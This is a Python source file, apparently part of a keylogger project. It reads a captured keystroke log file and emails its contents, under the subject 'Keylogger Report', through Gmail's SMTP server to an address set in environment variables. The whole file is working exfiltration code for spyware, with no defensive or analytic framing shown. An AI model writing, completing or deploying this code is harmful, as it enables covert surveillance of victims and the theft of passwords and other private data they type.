import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import os
from dotenv import load_dotenv
import config

load_dotenv()

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
RECEIVER_EMAIL = os.getenv("RECEIVER_EMAIL")


def send_log_email(log_file=None, reason="Manual send"):
    if log_file is None:
        log_file = config.LOG_FILE

    if not os.path.exists(log_file):
        print("[-] No log file found to send.")
        return

    with open(log_file, "r") as f:
        log_content = f.read()

    if not log_content.strip():
        print("[*] Log file is empty, nothing to send.")
        return

    msg = MIMEMultipart()
    msg["From"] = EMAIL_ADDRESS
    msg["To"] = RECEIVER_EMAIL
    msg["Subject"] = f"Keylogger Report - {reason}"

    body = MIMEText(log_content, "plain")
    msg.attach(body)

    try:
        with smtplib.SMTP("smtp.gmail.com", 587) as server:
            server.starttls()
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            server.send_message(msg)
        print(f"[+] Email sent successfully! Reason: {reason}")
    except Exception as e:
        print(f"[-] Failed to send email: {e}")


if __name__ == "__main__":
    send_log_email(reason="Manual test")